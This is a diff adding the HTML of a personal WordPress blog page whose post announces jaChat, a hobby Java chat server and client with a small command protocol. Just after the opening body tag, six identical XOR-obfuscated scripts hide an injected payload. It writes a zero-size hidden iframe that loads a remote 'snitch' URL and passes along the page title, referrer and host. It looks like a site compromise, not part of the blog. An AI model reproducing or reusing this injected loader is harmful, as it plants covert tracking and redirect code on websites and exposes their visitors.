@@ -1,0 +1,336 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xmlns:fb="http://ogp.me/ns/fb#" xmlns:addthis="http://www.addthis.com/help/api-spec" 
+ xmlns:og="http://opengraphprotocol.org/schema/"
+ xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:fb="http://www.facebook.com/2008/fbml"  xmlns:og="http://opengraphprotocol.org/schema/" >
+
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+<title>jaChat &laquo;  blog.pahunchev.co.uk</title>
+
+<link rel="stylesheet" href="http://blog.pahunchev.co.uk/wp-content/themes/streamline/style.css" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="blog.pahunchev.co.uk RSS Feed" href="http://blog.pahunchev.co.uk/feed" />
+<link rel="alternate" type="application/atom+xml" title="blog.pahunchev.co.uk Atom Feed" href="http://blog.pahunchev.co.uk/feed/atom" />
+<link rel="pingback" href="http://blog.pahunchev.co.uk/xmlrpc.php" />
+
+<style type="text/css" media="screen">
+
+	#page { background: url("http://blog.pahunchev.co.uk/wp-content/themes/streamline/images/kubrickbgwide.jpg") repeat-y top; border: none; }
+
+</style>
+
+<script type="text/javascript" src="http://blog.pahunchev.co.uk/wp-content/themes/streamline/general.js"></script>
+
+
+<link rel="alternate" type="application/rss+xml" title="blog.pahunchev.co.uk &raquo; jaChat Category Feed" href="http://blog.pahunchev.co.uk/posts/category/projects/jachat/feed" />
+<link rel='stylesheet' id='output-css'  href='http://blog.pahunchev.co.uk/wp-content/plugins/addthis/css/output.css?ver=3.5.2' type='text/css' media='all' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.pahunchev.co.uk/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.pahunchev.co.uk/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.5.2" />
+<script type="text/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-11705130-4']);
+_gaq.push(['_trackPageview']);
+(function() {
+var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+<meta property="og:site_name" content="blog.pahunchev.co.uk" />
+<meta property="og:type" content="article" />
+</head>
+<body>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+<div id="container">
+
+	<div id="faux_left">
+	
+		<div id="faux_right">
+		
+			<div class="content">
+			
+				<div id="pages_nav">
+					
+					<div id="pages_nav_left">
+					</div><!-- pages_nav_left ends -->
+					
+					<div id="pages_nav_inside">
+					
+						<ul>
+							<li><a href="http://blog.pahunchev.co.uk">Home</a></li>
+							<li class="page_item page-item-2"><a href="http://blog.pahunchev.co.uk/about">About</a></li>
+							<li class="nb"><a href="http://blog.pahunchev.co.uk/feed">RSS</a></li>
+						</ul>
+					
+					</div><!-- pages_nav_inside ends -->
+					
+					<div id="pages_nav_right">
+					</div><!-- pages_nav_right ends -->
+					
+				</div><!-- pages_nav ends -->
+			
+				<div id="header">
+					
+					<div id="header_inside">
+					<h1><a href="http://blog.pahunchev.co.uk/">blog.pahunchev.co.uk</a></h1>
+					<p>Geek by nature, Linux by choice.</p>
+					</div><!-- header_inside ends -->
+
+				</div><!-- header ends -->
+
+				<div id="faux_outer">
+
+				<div class="content_left">
+	
+			<!--
+ 	   	  		<h2 class="pagetitle">Archive for the &#8216;jaChat&#8217; Category</h2>
+ 	  -->
+
+
+		
+			<div class="entry" id="post-38">
+
+				<div class="entry_top entry_top_first">
+
+				<h2><a href="http://blog.pahunchev.co.uk/posts/38" rel="bookmark" title="jaChat Project started">jaChat Project started</a></h2>
+
+							<div class="date_holder">
+							
+								<div class="month_year">May 18<br /><span class="smaller">2010</span></div>
+								
+								<div class="comments_link">
+																		<a href="http://blog.pahunchev.co.uk/posts/38#respond">Leave a<br /><span class="smaller">Comment</span></a>
+																		</div>
+							</div><!-- date_holder ends -->
+					
+						</div><!-- entry_top ends -->
+						
+						<div class="faux_entry">
+
+							<div class="entry_content entry_content_first">
+								
+							<p>I am glad to announce the start of a new project. It&#8217;s working name is jaChat, comes from java &amp; chat.</p>
+<p>It is a complete chat system(i.e. server &amp; client). The first version will be really like existing IRC chat systems. But with the tendentious to be more like skype (I exclude the VoIP for now, because it is beyond my capabilities).</p>
+<p>As the name suggest base language is Java SE. Honestly there isn&#8217;t much point to make it, but it is a good exercise.</p>
+<p>One of my intentions is to use it in our school as a message exchanger in labs etc. The other one is to be used a real chat system, because the newest version of skype is full of bugs and my messages cannot reach half of my friends.</p>
+<p>The first version or the first draft uses the code name of: <strong>appletiser</strong> probably all of the releases will use a drink name . Do not ask me why! The technical details of the server are <strong>0.1.alpha.</strong></p>
+<p>As the previous sentence suggests the server has a working version, it is fully documented. Documentation can be found <a href="http://pahunchev.co.uk/projects/jaChat/documentation/server/">here.</a> Please bare in mind that this is really a draft, so documentations probably contains typos, grammar error etc.</p>
+<p>Extremely small set of command is implemented at his point :<br />
+<code><br />
+EHLO nickName  - every connection must start with authentication<br />
+USERS - the server returns all of the currently connected users<br />
+TALK nickName message - sends the message to nickName<br />
+STNCK newNickName - changes the screen name for that user<br />
+QUIT - log out<br />
+</code><span style="font-family: monospace;">&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-<br />
+</span><span style="font-family: monospace;">Server command:<br />
+DSCN &#8211; sent from the server to the client, says &#8220;I am disconnection you&#8221;<br />
+USERS listOfUsers &#8211; tells the client all of the users availabe to talk to<br />
+MSGF user message &#8211; you just received <em>message</em> from <em>user<br />
+</em>INCK &#8211; invalid nick name<br />
+</span></p>
+<p>I just started the client, so its progress is about 10%. I have done the main class (sets up connection, starts threads). Progress will be regularly poster here <img src='http://blog.pahunchev.co.uk/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> </p>
+<div class="addthis_toolbox addthis_default_style addthis_" addthis:url='http://blog.pahunchev.co.uk/posts/38' addthis:title='jaChat Project started ' ><a class="addthis_button_facebook"></a><a class="addthis_button_twitter"></a><a class="addthis_button_email"></a><a class="addthis_button_pinterest_share"></a><a class="addthis_button_compact"></a><a class="addthis_counter addthis_bubble_style"></a></div>							
+							</div><!-- entry_content ends -->
+							
+							<div class="entry_footer">
+							<span>Written by Petyo Pahunchev in: <a href="http://blog.pahunchev.co.uk/posts/category/projects/jachat" title="View all posts in jaChat" rel="category tag">jaChat</a>, <a href="http://blog.pahunchev.co.uk/posts/category/projects" title="View all posts in Projects" rel="category tag">Projects</a> |</span> <span></span>
+							</div><!-- entry_footer ends -->
+							
+						</div><!-- faux_entry ends -->
+
+					</div><!-- entry ends -->
+
+	    				
+		
+		<div class="navigation">
+			<div class="alignleft"></div>
+			<div class="alignright"></div>
+		</div>
+	
+ 
+				</div><!-- content_left ends -->
+				
+					<div id="sidebar">
+
+		<div id="sidebar_piece">
+		</div><!-- sidebar_piece ends -->
+
+			
+      		<form action="http://blog.pahunchev.co.uk/" id="search_form" method="get">
+			<fieldset>
+			<input type="text" class="txt" id="s" name="s" value="" />
+			<input type="image" class="submit" id="searchsubmit" src="http://blog.pahunchev.co.uk/wp-content/themes/streamline/images/btns/btn_search.jpg" title="Search" />
+			</fieldset>
+		</form>
+			<ul>
+
+			<li>
+
+						<h2 class="browsing">Currently browsing:<br /> jaChat Category Archives</h2>
+
+			
+			</li> 			
+			<li id="pages-3" class="widget widget_pages"><h2 class="widgettitle">Pages</h2>		<ul>
+			<li class="page_item page-item-2"><a href="http://blog.pahunchev.co.uk/about">About</a></li>
+		</ul>
+		</li><li id="categories-3" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>		<ul>
+	<li class="cat-item cat-item-10 current-cat"><a href="http://blog.pahunchev.co.uk/posts/category/projects/jachat" title="View all posts filed under jaChat">jaChat</a>
+</li>
+	<li class="cat-item cat-item-11"><a href="http://blog.pahunchev.co.uk/posts/category/lin" title="Linux tutorials, howtos, comments ">Linux</a>
+</li>
+	<li class="cat-item cat-item-9 current-cat-parent"><a href="http://blog.pahunchev.co.uk/posts/category/projects" title="View all posts filed under Projects">Projects</a>
+</li>
+	<li class="cat-item cat-item-12"><a href="http://blog.pahunchev.co.uk/posts/category/sec" title="Stuff on network security">Security</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://blog.pahunchev.co.uk/posts/category/tutorials" title="View all posts filed under Tutorials">Tutorials</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://blog.pahunchev.co.uk/posts/category/uncategorized" title="View all posts filed under Uncategorized">Uncategorized</a>
+</li>
+		</ul>
+</li><li id="tag_cloud-3" class="widget widget_tag_cloud"><h2 class="widgettitle">Tag cloud</h2><div class="tagcloud"><a href='http://blog.pahunchev.co.uk/posts/tag/64bit' class='tag-link-25' title='1 topic' style='font-size: 8pt;'>64bit</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/aircrack' class='tag-link-19' title='1 topic' style='font-size: 8pt;'>aircrack</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/insecure' class='tag-link-30' title='1 topic' style='font-size: 8pt;'>insecure</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/linux' class='tag-link-23' title='2 topics' style='font-size: 22pt;'>linux</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/magazine' class='tag-link-29' title='1 topic' style='font-size: 8pt;'>magazine</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/network' class='tag-link-16' title='1 topic' style='font-size: 8pt;'>network</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/optimisation' class='tag-link-28' title='1 topic' style='font-size: 8pt;'>optimisation</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/password' class='tag-link-22' title='1 topic' style='font-size: 8pt;'>password</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/penetration' class='tag-link-20' title='1 topic' style='font-size: 8pt;'>penetration</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/preload' class='tag-link-27' title='1 topic' style='font-size: 8pt;'>preload</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/resources' class='tag-link-21' title='1 topic' style='font-size: 8pt;'>resources</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/security' class='tag-link-15' title='2 topics' style='font-size: 22pt;'>security</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/skype' class='tag-link-24' title='1 topic' style='font-size: 8pt;'>skype</a>
+<a href='http://blog.pahunchev.co.uk/posts/tag/wi-fi' class='tag-link-18' title='1 topic' style='font-size: 8pt;'>wi-fi</a></div>
+</li><li id="calendar-3" class="widget widget_calendar"><h2 class="widgettitle">Calendar</h2><div id="calendar_wrap"><table id="wp-calendar">
+	<caption>October 2018</caption>
+	<thead>
+	<tr>
+		<th scope="col" title="Monday">M</th>
+		<th scope="col" title="Tuesday">T</th>
+		<th scope="col" title="Wednesday">W</th>
+		<th scope="col" title="Thursday">T</th>
+		<th scope="col" title="Friday">F</th>
+		<th scope="col" title="Saturday">S</th>
+		<th scope="col" title="Sunday">S</th>
+	</tr>
+	</thead>
+
+	<tfoot>
+	<tr>
+		<td colspan="3" id="prev"><a href="http://blog.pahunchev.co.uk/posts/date/2011/03" title="View posts for March 2011">&laquo; Mar</a></td>
+		<td class="pad">&nbsp;</td>
+		<td colspan="3" id="next" class="pad">&nbsp;</td>
+	</tr>
+	</tfoot>
+
+	<tbody>
+	<tr><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td id="today">6</td><td>7</td>
+	</tr>
+	<tr>
+		<td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td>
+	</tr>
+	<tr>
+		<td>15</td><td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td>
+	</tr>
+	<tr>
+		<td>22</td><td>23</td><td>24</td><td>25</td><td>26</td><td>27</td><td>28</td>
+	</tr>
+	<tr>
+		<td>29</td><td>30</td><td>31</td>
+		<td class="pad" colspan="4">&nbsp;</td>
+	</tr>
+	</tbody>
+	</table></div></li><li id="text-3" class="widget widget_text"><h2 class="widgettitle">Wise quotes</h2>			<div class="textwidget"><cite> Geek by nature, Linux by choice. </cite>
+<p style="text-align: right"> Unknown </p>
+<cite>The quieter you become, the more you are able to hear.</cite>
+<p style="text-align: right">BackTrack slogan</p>
+<cite>Avoid the Gates of Hell. Use Linux.</cite>
+<p style="text-align: right"> Unknown</p></div>
+		</li>		</ul>
+	</div><!-- sidebar ends -->
+				<div id="widget_lists">
+
+				
+					<div class="widget_list_unit">
+					
+					<h3>Visit Our Friends!</h3>
+					
+					<p>A few highly recommended friends...</p>
+					
+					<ul>
+					<li><a href="http://security-sh3ll.blogspot.com" target="_blank">Security blog</a></li>
+											
+					</ul>
+					
+					</div><!-- widget_list_unit -->
+
+					<div class="widget_list_unit">
+
+					<h3>Archives</h3>
+					
+					<p>All entries, chronologically...</p>
+					
+					<ul>
+						<li><a href='http://blog.pahunchev.co.uk/posts/date/2011/03' title='March 2011'>March 2011</a></li>
+	<li><a href='http://blog.pahunchev.co.uk/posts/date/2010/05' title='May 2010'>May 2010</a></li>
+	<li><a href='http://blog.pahunchev.co.uk/posts/date/2010/04' title='April 2010'>April 2010</a></li>
+					</ul>
+					</div><!-- widget_list_unit -->
+
+					<div class="widget_list_unit">
+
+					<h3>Pages List</h3>
+					
+					<p>General info about this blog...</p>
+					
+					<ul>
+					<li class="page_item page-item-2"><a href="http://blog.pahunchev.co.uk/about">About</a></li>
+					</ul>
+				
+					</div><!-- widget_list_unit -->
+
+					
+					<div id="widget_lists_bottom">
+					</div><!-- widget_lists_bottom ends -->
+
+				</div><!-- widget_lists ends -->
+
+				</div><!-- faux_outer ends -->
+			
+				<div id="footer">
+					
+					<div id="footer_left">Copyright &copy; 2018 - blog.pahunchev.co.uk</div>
+					
+					<div id="footer_right">
+</div>
+
+				</div><!-- footer ends -->
+
+			</div><!-- content ends -->
+
+		</div><!-- faux_right ends -->
+		
+	</div><!-- faux_left ends -->
+	
+</div><!-- container ends -->
+
+<div style="position: absolute; top: -10000px; left: -10000px;  width: 0px; height: 0px;" id="FB_HiddenContainer"></div><link type="text/css" rel="stylesheet" href="http://blog.pahunchev.co.uk/wp-content/plugins/wp-facebookconnect//fbconnect.css"></link>
+<script src="http://static.ak.connect.facebook.com/js/api_lib/v0.4/FeatureLoader.js.php" type="text/javascript"></script>
+<script src="http://blog.pahunchev.co.uk/wp-content/plugins/wp-facebookconnect//fbconnect.js" type="text/javascript"></script><!-- no logged in Facebook user --><div class="fbc_loginstate_top"></div><script type="text/javascript">
+FBConnect.init('176335685745923', 'http://blog.pahunchev.co.uk/wp-content/plugins/wp-facebookconnect/', 'http://blog.pahunchev.co.uk', 0, FBConnect.appconfig_reload);
+
+</script><script type="text/javascript">
+
+var addthis_config = {"data_track_clickback":true,"data_track_addressbar":false,"data_track_textcopy":false,"ui_atversion":"300"};
+var addthis_product = 'wpp-3.1';
+</script><script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=petyo%40pahunchev.co.uk"></script><script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201840'></script>
+<!--wp_footer--></body>
+</html> 
